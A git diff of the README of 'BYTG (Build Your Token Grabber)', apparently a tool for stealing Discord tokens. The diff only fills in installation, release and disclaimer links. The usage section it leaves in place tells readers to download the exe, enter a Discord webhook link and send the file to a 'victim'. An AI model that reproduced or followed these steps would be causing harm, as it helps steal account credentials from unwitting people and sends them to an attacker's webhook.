@@ -5,7 +5,7 @@
 </div>
 <div align="center">
   Star ⭐ if you want more <br>
-  <a href="">Installation</a> | <a href="https://discord.gg/XnRjFmgPYz">Discord</a> | <a href="">Disclaimer</a>
+  <a href="https://github.com/CaptainBeluga/BYTG#-usage">Installation</a> | <a href="https://discord.gg/XnRjFmgPYz">Discord</a> | <a href="https://github.com/CaptainBeluga/BYTG#warning-disclaimer">Disclaimer</a>
 </div>
 
 ## 📍 About
@@ -13,7 +13,7 @@ BYTG (Build Your Token Grabber)
 ![screen](https://user-images.githubusercontent.com/87500882/232589478-16f0263b-6e8b-4561-bcd0-caa65df1d954.png)
 
 ## 💻 Usage
-* Download the exe verions from the last [realese]().
+* Download the exe verions from the last [realese](https://github.com/CaptainBeluga/BYTG/releases/).
 * Execute it.
 * Input your discord webhook link.
 * Send the exe file to your victim.
